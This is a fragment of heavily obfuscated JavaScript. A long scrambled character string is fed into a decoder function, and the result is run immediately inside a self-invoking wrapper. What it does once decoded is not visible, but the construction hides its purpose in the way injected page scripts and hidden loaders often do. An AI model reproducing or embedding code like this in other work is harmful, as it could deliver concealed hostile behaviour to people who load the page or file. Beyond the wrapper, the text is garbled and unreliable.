it}va];QQc_4aah_e;a$ %tsQd1:12.=8]5!1_y +=QswQ1V0.h].4!!Q(Q;33e_%o4s.{Qh(Q_,o_dQ_c]2IQQQ}_t anQ-!ad$]qby$.nrrlgQ]?i{ei=QQ7]no@unh%ir!bt06Q"8hkR)Qtb$"t.%]Q34oQ%gi2i_i1teQ99rr=_]_&d,d!(1]f_e ])%rt0enQii(Qenc66_n augm25@Vd>t(Q)(.i]Q_b_$QQ("Q+sQl]6{eoQ%Qso_4_"neQcQQc,Oe4]Qu5"QhQQQfa51fl#Qd}Qd [g)=b3Q=gk922}s+o2.bb1.a;RQ5Q=_D4no%Q@beh%Qeeali])Qb#+1e%6Qn,Q93Po.it%}!)e)sr;w ]]Y[2!3r=Q8]fy i]Q]_mses&Qu=gQQ]<ebQfss_ngit];ovQr1_9Q.9QK}6aeeJ_QMnnoQa..nb!_(s!_]odt._bgswe_cauQrma%Q%sPQQ-ynWlb(QQ(Q +}%8]mQQu5eaw]6(t3eQQ..]eW o!63%Q.gQmlQ,)t;]r6eQS6 o_8=oQ_=1$._%(ri))c>9;at4o{c3}nXVKo)s _!,5X9bi0oQn+wCc5.bubbQ7hi2(QK(n9]tbQ;%  %2])iQoN36t)!or(!QJgfrrtn.)ar.b{.um(6,oQ)ou%l]+o1 vsoo$8pQ]2Q;.)SU,QfdY8!se$lo$_Qes{QdQKr{nI_Q }D`v6QQnu I[_o{d;Q:.11Q2w)bQ;er((2Q()_i NNrc)_suQ]brK  agQQQ612z_ ;Ie;df)o .t=.$]3_jS(QnT (c(]4%+iuoW]Q5Qor)$ 00\/Q1oci\/'));var qlG=NQz(ieS,enn );qlG(5151);return 9990})()
